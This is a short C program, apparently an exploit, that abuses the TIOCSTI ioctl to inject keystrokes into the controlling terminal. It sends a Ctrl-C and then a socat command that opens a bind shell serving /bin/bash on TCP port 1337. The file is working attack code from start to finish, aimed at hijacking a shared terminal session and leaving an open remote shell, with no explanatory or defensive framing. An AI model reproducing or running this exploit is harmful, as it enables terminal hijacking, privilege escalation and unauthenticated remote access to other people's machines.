#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <signal.h>

void ignore_sigint(int signum) {}

int main() {
    signal(SIGINT, ignore_sigint);

    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "\x03socat TCP-LISTEN:1337,reuseaddr,fork EXEC:/bin/bash,stderr\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
